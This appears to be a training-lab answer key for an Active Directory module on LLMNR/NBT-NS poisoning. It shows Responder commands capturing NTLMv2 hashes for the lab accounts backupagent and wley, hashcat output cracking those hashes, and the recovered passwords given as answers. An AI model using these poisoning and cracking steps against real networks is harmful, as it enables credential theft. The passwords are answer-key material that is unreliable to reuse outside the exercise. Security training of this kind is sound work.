# Section 06: LLMNR/NBT-NS Poisoning - from Linux

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.

Context:
```bash
sudo responder -I ens224 

<SNIP>
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:1ed24a33ecd8952f:7B236EFA6BA84D66EEE054BABAE619A8:01010000000000008065200AB02EDD011D511147156D33A1000000000200080035004C003100330001001E00570049004E002D00430056004A0049004300410057003900570032005A0004003400570049004E002D00430056004A0049004300410057003900570032005A002E0035004C00310033002E004C004F00430041004C000300140035004C00310033002E004C004F00430041004C000500140035004C00310033002E004C004F00430041004C00070008008065200AB02EDD0106000400020000000800300030000000000000000000000000300000802A167DEECB9FB9324013CF794042AE85F5517FF19B9A97E326C8AFBA2F37570A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
<SNIP>
```

**Answer:** `backupagent`

---

### 2. Crack the hash for the previous account and submit the cleartext password as your answer.

Context:
```bash
┌─[eu-academy-2]─[10.10.14.24]─[htb-ac-2162140@htb-591izwzhud-htb-cloud-com]─[~]
└──╼ [★]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660302 bytes (71.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

BACKUPAGENT::INLANEFREIGHT:1ed24a33ecd8952f:7b236efa6ba84d66eee054babae619a8:01010000000000008065200ab02edd011d511147156d33a1000000000200080035004c003100330001001e00570049004e002d00430056004a0049004300410057003900570032005a0004003400570049004e002d00430056004a0049004300410057003900570032005a002e0035004c00310033002e004c004f00430041004c000300140035004c00310033002e004c004f00430041004c000500140035004c00310033002e004c004f00430041004c00070008008065200ab02edd0106000400020000000800300030000000000000000000000000300000802a167deecb9fb9324013cf794042ae85f5517ff19b9a97e326c8afba2f37570a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BACKUPAGENT::INLANEFREIGHT:1ed24a33ecd8952f:7b236ef...000000
Time.Started.....: Tue Aug 18 01:46:40 2026 (4 secs)
Time.Estimated...: Tue Aug 18 01:46:44 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1790.5 kH/s (0.84ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7733248/14344385 (53.91%)
Rejected.........: 0/7733248 (0.00%)
Restore.Point....: 7731200/14344385 (53.90%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: h2nzyoo -> h101814

Started: Tue Aug 18 01:46:33 2026
Stopped: Tue Aug 18 01:46:46 2026
```

**Answer:** `h1backup55`

---

### 3. Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.

Context:
```bash
sudo responder -I ens224 

<SNIP>
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:0afe743894dbdc52:08134907A3E6ABB50D69235E554E4A0B:01010000000000008065200AB02EDD0175443279FF29A31F000000000200080035004C003100330001001E00570049004E002D00430056004A0049004300410057003900570032005A0004003400570049004E002D00430056004A0049004300410057003900570032005A002E0035004C00310033002E004C004F00430041004C000300140035004C00310033002E004C004F00430041004C000500140035004C00310033002E004C004F00430041004C00070008008065200AB02EDD0106000400020000000800300030000000000000000000000000300000802A167DEECB9FB9324013CF794042AE85F5517FF19B9A97E326C8AFBA2F37570A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
<SNIP>
```
```bash
┌─[eu-academy-2]─[10.10.14.24]─[htb-ac-2162140@htb-591izwzhud-htb-cloud-com]─[~]
└──╼ [★]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

WLEY::INLANEFREIGHT:0afe743894dbdc52:08134907a3e6abb50d69235e554e4a0b:01010000000000008065200ab02edd0175443279ff29a31f000000000200080035004c003100330001001e00570049004e002d00430056004a0049004300410057003900570032005a0004003400570049004e002d00430056004a0049004300410057003900570032005a002e0035004c00310033002e004c004f00430041004c000300140035004c00310033002e004c004f00430041004c000500140035004c00310033002e004c004f00430041004c00070008008065200ab02edd0106000400020000000800300030000000000000000000000000300000802a167deecb9fb9324013cf794042ae85f5517ff19b9a97e326c8afba2f37570a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WLEY::INLANEFREIGHT:0afe743894dbdc52:08134907a3e6ab...000000
Time.Started.....: Tue Aug 18 01:48:43 2026 (2 secs)
Time.Estimated...: Tue Aug 18 01:48:45 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1850.1 kH/s (0.83ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3098624/14344385 (21.60%)
Rejected.........: 0/3098624 (0.00%)
Restore.Point....: 3096576/14344385 (21.59%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: trapping1 -> tramore1993

Started: Tue Aug 18 01:48:42 2026
Stopped: Tue Aug 18 01:48:45 2026
```

**Answer:** `transporter@4`

---

[Back to Module Index](./README.md)
